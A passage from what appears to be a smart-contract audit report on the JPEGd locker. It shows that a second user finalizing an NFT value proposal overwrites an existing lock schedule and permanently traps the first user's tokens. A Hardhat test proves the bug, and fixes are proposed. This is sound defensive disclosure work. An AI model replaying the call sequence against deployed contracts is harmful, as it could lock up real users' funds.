The existing user will be unable to withdraw his locked JPEGs, resulting in permanent lock up of JPEG in the locker contract.  ## Proof of Concept  1. `user` successfully proposes and finalizes a proposal to change his NFT’s collateral value 2. Another user (`owner`) does the same for the same NFT index 3. `user` will be unable to withdraw his locked JPEG because schedule has been overwritten  Insert this test case into [`NFTVault.ts`](https://github.com/code-423n4/2022-04-jpegd/blob/main/tests/NFTVault.ts).  ```jsx it.only("will overwrite existing user's JPEG lock schedule", async () => {   // 0. setup   const index = 7000;   await erc721.mint(user.address, index);   await nftVault     .connect(dao)     .setPendingNFTValueETH(index, units(50));   await jpeg.transfer(user.address, units(150000));   await jpeg.connect(user).approve(locker.address, units(500000));   await jpeg.connect(owner).approve(locker.address, units(500000));    // 1. user has JPEG locked for finalization   await nftVault.connect(user).finalizePendingNFTValueETH(index);    // 2. owner submit proposal to further increase NFT value   await nftVault     .connect(dao)     .setPendingNFTValueETH(index, units(100));      // 3. owner finalizes, has JPEG locked   await nftVault.connect(owner).finalizePendingNFTValueETH(index);    // user schedule has been overwritten   let schedule = await locker.positions(index);   expect(schedule.owner).to.equal(owner.address);    // user tries to unstake   // wont be able to because schedule was overwritten   await timeTravel(days(366));   await expect(locker.connect(user).unlock(index)).to.be.revertedWith("unauthorized"); }); ```  ## Recommended Mitigation Steps  1. Release the tokens of the existing schedule. Simple and elegant.  ```jsx // in JPEGLock#lockFor() LockPosition memory existingPosition = positions[_nftIndex]; if (existingPosition.owner != address(0)) {   // release jpegs to existing owner   jpeg.safeTransfer(existingPosition.owner, existingPosition.lockAmount); } ```  2. Revert in `finalizePendingNFTValueETH()` there is an existing lock schedule. This is less desirable IMO, as there is a use-case for increasing / decreasing the NFT value.
